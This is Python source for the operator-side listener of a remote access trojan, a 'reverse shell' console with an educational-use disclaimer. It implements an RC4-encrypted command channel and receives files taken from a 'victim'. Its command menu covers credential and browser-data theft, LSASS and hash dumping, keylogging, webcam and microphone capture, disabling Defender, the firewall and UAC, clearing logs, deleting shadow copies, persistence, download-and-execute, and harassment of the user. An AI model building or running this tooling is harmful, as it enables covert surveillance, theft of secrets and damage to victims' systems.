
---

## listener.py (v3.5) – Fully Commented in English

```python
#!/usr/bin/env python3
# listener.py v3.0 - Advanced Listener for Reverse Shell
# Educational use / authorized pentesting only

# -------------------- IMPORTS --------------------
import socket               # TCP server socket
import sys                  # System exit
import base64               # Decode file chunks received from victim
import os                   # File system operations and local command execution
import time                 # Generate timestamps for default filenames
import datetime             # Session logging
import hashlib              # SHA‑256 for RC4 key derivation

# -------------------- CONFIGURATION --------------------
LISTEN_IP = "0.0.0.0"           # Listen on all available network interfaces
LISTEN_PORT = 4444              # Port to listen on (must match victim's ATTACKER_PORT)
SHARED_SECRET = b"R3vSh3ll_v3_S3cr3t_K3y!"   # Must match victim's SHARED_SECRET

# ANSI color codes for better readability
RST = "\033[0m"
G = "\033[92m"
R = "\033[91m"
Y = "\033[93m"
B = "\033[94m"
C = "\033[96m"
M = "\033[95m"
BOLD = "\033[1m"
DIM = "\033[2m"
W = "\033[97m"

# Commands that return a file (status_msg + FILE_START/chunks/FILE_END)
FILE_COMMANDS = {
    "steal", "sysinfo", "screenshot", "browsers", "exfil",
    "record_screen", "record_mic", "webcam_snap", "dump_lsass",
    "download_dir", "scrloop dump"
}

# Default file extensions for received files
FILE_EXTENSIONS = {
    "steal": ".zip",
    "sysinfo": ".tar",
    "screenshot": ".png",
    "browsers": ".zip",
    "exfil": ".tar",
    "record_screen": ".zip",
    "record_mic": ".wav",
    "webcam_snap": ".jpg",
    "dump_lsass": ".dmp",
    "download_dir": ".zip",
    "scrloop": ".zip",
}

# ASCII art banner
BANNER = f"""
{M}{BOLD}
╔═══════════════════════════════════════════════════════════════════════╗
║                                                                       ║
║    ██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗      ██╗      ║
║    ██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║      ██║      ║
║    ██████╔╝█████╗  ██║   ██║███████╗███████║█████╗  ██║      ██║      ║
║    ██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔══██║██╔══╝  ██║      ██║      ║
║    ██║  ██║███████╗ ╚████╔╝ ███████║██║  ██║███████╗███████╗ ██████╗  ║
║    ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝  ║
║                                                                       ║
║               Advanced Reverse Shell Listener v3.0                    ║
║                                                                       ║
╚═══════════════════════════════════════════════════════════════════════╝
{RST}"""

# Local help message displayed when 'help' is typed in the listener
LOCAL_HELP = f"""
{C}{BOLD}═══════════════════════════════════════════════════════════════{RST}
{C}  REMOTE COMMANDS v3.0 (sent to victim){RST}
{C}═══════════════════════════════════════════════════════════════{RST}

  {G}NAVIGATION & FILES:{RST}
    cd <dir> / pwd / ls [dir]     Basic navigation
    tree [dir] [depth]            Directory tree
    download <file>               Download file from victim
    download_dir <dir>            Download entire directory (ZIP)
    upload <file>                 Upload file to victim
    cat <file>                    Read text file
    head <file> [n] / tail <f> [n]  First/last N lines
    search <pattern>              Search files by name on C:\\
    grep <text> [path]            Search text inside files
    file_info <path>              Detailed info + MD5/SHA256 hashes
    touch <f> / mkdir <d> / rmdir <r>  Create/delete files/dirs
    mv <src> <dst> / cp <src> <dst>    Move/copy
    write <file> <content>        Write to file
    append <file> <content>       Append line to file
    chattr <file> [timestamp]     Change file timestamps

  {Y}COLLECTION (return a file):{RST}
    steal                 Steal Desktop/Downloads/Docs/Pictures/Videos
    sysinfo               Full system enumeration (.tar)
    screenshot            Screen capture (.png)
    browsers              Browser data (.zip)
    exfil                 TOTAL exfiltration (.tar)
    record_screen <sec>   Record screen (.zip)
    record_mic <sec>      Record microphone (.wav)
    webcam_snap           Webcam photo (.jpg)
    scrloop <start [s]|stop|dump|clear>   Periodic screenshot

  {B}CREDENTIALS & SECRETS:{RST}
    wifi                  Saved WiFi passwords
    credvault             Windows Credential Manager
    find_secrets          Search SSH, .env, VPN, KeePass, etc.
    ssh_keys              List SSH keys
    token_steal           Tokens, sessions, identity

  {B}INFORMATION & RECON:{RST}
    status / quick_info           Basic / full info
    geolocate                     Geolocation by IP
    proc_list / software          Processes / installed software
    net_scan [subnet]             LAN ping sweep
    port_scan <ip> [ports]        Port scan
    dns_lookup <dom>              DNS resolution
    traceroute <host>             Trace route
    arp_table / active_conn / netstat   Network
    list_wifi                     Nearby WiFi
    privesc                       Escalation vectors
    getenv [var]                  Environment variables
    disk_info / uptime / screen_res   Hardware
    idle_time / timezone          User state
    recent_files / drivers        Recent files / drivers
    startup_list / shares         Startup / shared resources
    whoami / hostname             Identity
    net_user [u] / net_group [g]  Users/groups
    reg_query <path>              Query registry

  {G}APP CONTROL:{RST}
    kill_app / open_app / hide_app / show_app <name>

  {M}DISRUPTION & TROLLING:{RST}
    lock_screen / change_wallpaper <path> / wallpaper_url <url>
    alert <msg> / msgbox <title>|<text>
    play_sound / set_volume <0-100> / tts <text>
    type_text <text> / open_url <url>
    swap_mouse / restore_mouse       Swap mouse buttons
    hide_taskbar / show_taskbar      Hide taskbar
    crazy_cursor [sec]               Crazy cursor (def: 10s)
    open_cd / close_cd               Open/close CD

  {C}CLIPBOARD:{RST}
    clipboard / clip_set <text>
    clip_monitor <start|stop|dump|clear>
    wipe_clipboard / hosts_edit <dom> <ip>

  {Y}PORT FORWARDING:{RST}
    port_fwd <lport> <rhost> <rport>  TCP pivot
    port_fwd_stop [lport]             Stop forwarding
    port_fwd_list                     List forwards

  {G}POWER:{RST}
    battery / reboot / shutdown / logoff

  {Y}DOWNLOADS:{RST}
    download_url <url> [dest]     Download from internet
    exec_remote <url>             Download and execute

  {R}ADMIN (requires privileges):{RST}
    disable_defender / disable_firewall / disable_uac
    dump_hashes / dump_lsass
    clear_logs / exclude_path <p> / exclude_ext <ext>
    enable_rdp / add_user <u> <p>
    blue_screen ☢️
    disable_taskmgr / enable_taskmgr
    disable_cmd / enable_cmd
    shadow_list / shadow_delete
    sys_persist / persist_wmi / safe_mode_persist

  {M}PERSISTENCE:{RST}
    persist [all|registry|task|startup]
    persist check / toggle / remove

  {R}KEYLOGGER:{RST}
    keylog start|stop|dump|clear

  {Y}CLEANUP & EXIT:{RST}
    autodestroy               Delete EVERYTHING
    cleanup                   Clean temporary files
    ps <cmd>                  PowerShell directly
    exit / kill_shell
    kill <process>            taskkill
    <cmd>                     Execute in cmd

  {DIM}LOCAL (prefix '!'):{RST}
    !<cmd>                Execute command on YOUR machine
    !clear / !cls         Clear screen

{C}═══════════════════════════════════════════════════════════════{RST}
"""

# ===================== CRYPTO (RC4 + Nonce) =====================

def _rc4(key: bytes, data: bytes) -> bytes:
    """RC4 stream cipher implementation."""
    S = list(range(256))
    j = 0
    # Key‑scheduling algorithm (KSA)
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    result = bytearray()
    # Pseudo‑random generation algorithm (PRGA)
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        result.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(result)

def _encrypt_data(data: bytes) -> bytes:
    """
    Encrypt data using RC4 with a random nonce.
    Returns: nonce (8 bytes) + RC4_ciphertext
    """
    nonce = os.urandom(8)
    key = hashlib.sha256(SHARED_SECRET + nonce).digest()
    return nonce + _rc4(key, data)

def _decrypt_data(data: bytes) -> bytes:
    """
    Decrypt data that was encrypted with _encrypt_data.
    Expects at least 8 bytes (the nonce).
    """
    if len(data) < 8:
        return data
    nonce = data[:8]
    key = hashlib.sha256(SHARED_SECRET + nonce).digest()
    return _rc4(key, data[8:])

def send_encrypted(sock: socket.socket, data):
    """
    Send data over the socket after encrypting it and prefixing with length.
    Protocol: [4-byte big-endian length] + [nonce + RC4 ciphertext]
    """
    if isinstance(data, str):
        data = data.encode('utf-8')
    encrypted = _encrypt_data(data)
    sock.send(len(encrypted).to_bytes(4, 'big'))
    sock.sendall(encrypted)

def recv_encrypted(sock: socket.socket) -> str | None:
    """
    Receive an encrypted message from the socket.
    Returns the decrypted UTF-8 string, or None if connection is closed.
    """
    raw_len = sock.recv(4)
    if not raw_len:
        return None
    length = int.from_bytes(raw_len, 'big')
    data = b''
    while len(data) < length:
        chunk = sock.recv(min(4096, length - len(data)))
        if not chunk:
            break
        data += chunk
    try:
        return _decrypt_data(data).decode('utf-8', errors='replace')
    except:
        return None

# ===================== FILE HELPERS =====================

def receive_file_data(sock: socket.socket, save_path: str) -> tuple[bool, str]:
    """
    Receive a file from the victim using the custom protocol.
    Expects the stream to already be positioned after FILE_START.
    Reads chunks until FILE_END, decodes base64, and writes to save_path.
    Returns (True, success_message) or (False, error_message).
    """
    try:
        with open(save_path, 'wb') as f:
            while True:
                part = recv_encrypted(sock)
                if part is None:
                    return False, "Connection closed during reception"
                if part == "FILE_END":
                    break
                f.write(base64.b64decode(part))
        size = os.path.getsize(save_path)
        return True, f"Saved: {save_path} ({size:,} bytes)"
    except Exception as e:
        return False, f"Error: {e}"

def get_save_path(cmd_name: str) -> str:
    """Prompt the user for a save location with a sensible default."""
    ts = time.strftime("%Y%m%d_%H%M%S")
    # Handle compound commands like "record_screen 10" or "scrloop dump"
    base_cmd = cmd_name.split()[0] if ' ' in cmd_name else cmd_name
    ext = FILE_EXTENSIONS.get(base_cmd, ".bin")
    default = f"{base_cmd}_{ts}{ext}"
    user_path = input(f"{Y}Save as [{default}]: {RST}").strip()
    return user_path if user_path else default

def handle_file_command(sock: socket.socket, cmd: str) -> bool:
    """
    Handle commands that return: status_msg + FILE_START + data + FILE_END.
    Reads status, if it's an error (starts with '[-]') displays it and stops.
    Otherwise, expects FILE_START, prompts for save path, and receives file.
    Returns False if connection is lost.
    """
    # Read status message (success or error)
    status = recv_encrypted(sock)
    if status is None:
        print(f"{R}[!] Connection closed{RST}")
        return False
    print(f"{C}{status}{RST}")

    # If status indicates an error, no file follows
    if status.startswith("[-]"):
        return True

    # Now expect FILE_START
    marker = recv_encrypted(sock)
    if marker is None:
        print(f"{R}[!] Connection closed{RST}")
        return False
    if marker != "FILE_START":
        # Unexpected response
        print(f"{R}{marker}{RST}")
        return True

    save_path = get_save_path(cmd)
    ok, msg = receive_file_data(sock, save_path)
    print(f"{G if ok else R}{'[+]' if ok else '[-]'} {msg}{RST}")
    return True

def handle_download(sock: socket.socket, cmd: str) -> bool:
    """
    Handle the 'download' command.
    The victim may respond with FILE_START (file follows) or an error text.
    """
    first = recv_encrypted(sock)
    if first is None:
        print(f"{R}[!] Connection closed{RST}")
        return False
    if first == "FILE_START":
        fname = cmd[9:].strip()
        default_name = os.path.basename(fname)
        user_path = input(f"{Y}Save as [{default_name}]: {RST}").strip()
        save_path = user_path if user_path else default_name
        ok, msg = receive_file_data(sock, save_path)
        print(f"{G if ok else R}{'[+]' if ok else '[-]'} {msg}{RST}")
    else:
        print(f"{R}{first}{RST}")
    return True

def handle_upload(sock: socket.socket, cmd: str) -> bool:
    """
    Handle the 'upload' command.
    Victim sends READY_FOR_UPLOAD, we send file chunks, then FILE_END.
    """
    filename = cmd[7:].strip()
    # Wait for READY_FOR_UPLOAD
    ready = recv_encrypted(sock)
    if ready != "READY_FOR_UPLOAD":
        print(f"{R}[!] Unexpected response: {ready}{RST}")
        return True

    if not os.path.exists(filename):
        print(f"{R}[-] Local file not found: {filename}{RST}")
        send_encrypted(sock, "FILE_END")
        final = recv_encrypted(sock)
        if final:
            print(final)
        return True

    try:
        with open(filename, 'rb') as f:
            while True:
                chunk = f.read(3 * 1024)
                if not chunk:
                    break
                send_encrypted(sock, base64.b64encode(chunk).decode('ascii'))
        send_encrypted(sock, "FILE_END")
    except Exception as e:
        print(f"{R}[-] Error reading file: {e}{RST}")
        send_encrypted(sock, "FILE_END")

    final = recv_encrypted(sock)
    if final:
        print(f"{G}{final}{RST}")
    return True

def is_file_command(cmd: str) -> bool:
    """Check if a command returns a file (status_msg + FILE_START/data/FILE_END)."""
    # Exact match
    if cmd in FILE_COMMANDS:
        return True
    # Prefix match for parametrized file commands
    base = cmd.split()[0] if ' ' in cmd else cmd
    if base in {"record_screen", "record_mic", "webcam_snap", "dump_lsass", "download_dir"}:
        return True
    # scrloop dump specifically
    if cmd.startswith("scrloop ") and "dump" in cmd:
        return True
    return False

# ===================== SESSION LOG =====================

def log_session(addr: str, message: str):
    """Log session activity to a file named session_YYYY-MM-DD.log."""
    log_dir = "session_logs"
    os.makedirs(log_dir, exist_ok=True)
    date_str = datetime.datetime.now().strftime('%Y-%m-%d')
    log_file = os.path.join(log_dir, f"session_{date_str}.log")
    timestamp = datetime.datetime.now().strftime('%H:%M:%S')
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(f"[{timestamp}] [{addr}] {message}\n")

# ===================== MAIN =====================

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LISTEN_IP, LISTEN_PORT))
    server.listen(1)

    print(BANNER)
    print(f"{G}[*] Listening on {LISTEN_IP}:{LISTEN_PORT}...{RST}")
    print(f"{DIM}    Type 'help' to see available commands{RST}\n")

    while True:
        client, addr = server.accept()
        addr_str = f"{addr[0]}:{addr[1]}"
        print(f"\n{G}{BOLD}[+] Connection received from {addr_str}!{RST}")
        log_session(addr_str, "CONNECTED")

        try:
            banner = recv_encrypted(client)
            if banner:
                print(f"{C}{banner}{RST}")
                log_session(addr_str, f"BANNER: {banner}")

            while True:
                cmd = input(f"\n{Y}{BOLD}shell>{RST} ").strip()
                if not cmd:
                    continue

                # --- Local commands (prefix '!') ---
                if cmd.startswith('!'):
                    local_cmd = cmd[1:].strip()
                    if local_cmd in ('clear', 'cls'):
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(BANNER)
                        print(f"{G}[*] Listening on {LISTEN_IP}:{LISTEN_PORT}...{RST}")
                        print(f"{G}{BOLD}[+] Connected to {addr_str}!{RST}")
                        if banner:
                            print(f"{C}{banner}{RST}")
                        print(f"{DIM}    Type 'help' to see available commands{RST}\n")
                    elif local_cmd:
                        print(f"{B}[*] Local: {local_cmd}{RST}")
                        os.system(local_cmd)
                    continue

                if cmd == "help":
                    print(LOCAL_HELP)
                    continue

                # --- Send command to victim ---
                log_session(addr_str, f"CMD: {cmd}")
                send_encrypted(client, cmd)

                # --- Dispatch based on command type ---
                if cmd in ("exit", "kill_shell"):
                    print(f"{R}[*] {'Connection closed' if cmd == 'exit' else 'Victim process terminated'}{RST}")
                    log_session(addr_str, f"SESSION END ({cmd})")
                    break

                elif cmd == "autodestroy":
                    response = recv_encrypted(client)
                    if response:
                        print(f"{R}{response}{RST}")
                        log_session(addr_str, "AUTODESTROY")
                    break

                elif cmd.startswith("upload "):
                    if not handle_upload(client, cmd):
                        break

                elif cmd.startswith("download ") and not cmd.startswith("download_dir ") and not cmd.startswith("download_url "):
                    if not handle_download(client, cmd):
                        break

                elif is_file_command(cmd):
                    if not handle_file_command(client, cmd):
                        break

                else:
                    # Text command: single response
                    response = recv_encrypted(client)
                    if response is None:
                        print(f"{R}[!] Connection closed by client{RST}")
                        log_session(addr_str, "CONNECTION LOST")
                        break
                    print(response)
                    log_session(addr_str, f"RESPONSE: {response[:200]}")

        except (socket.error, ConnectionResetError) as e:
            print(f"{R}[-] Error: {e}{RST}")
            log_session(addr_str, f"ERROR: {e}")
        except KeyboardInterrupt:
            print(f"\n{Y}[*] Ctrl+C in session. Returning to listen...{RST}")
        finally:
            client.close()
            print(f"{R}[*] Connection closed. Waiting for new connection...\n{RST}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Exiting...{RST}")
        sys.exit(0)
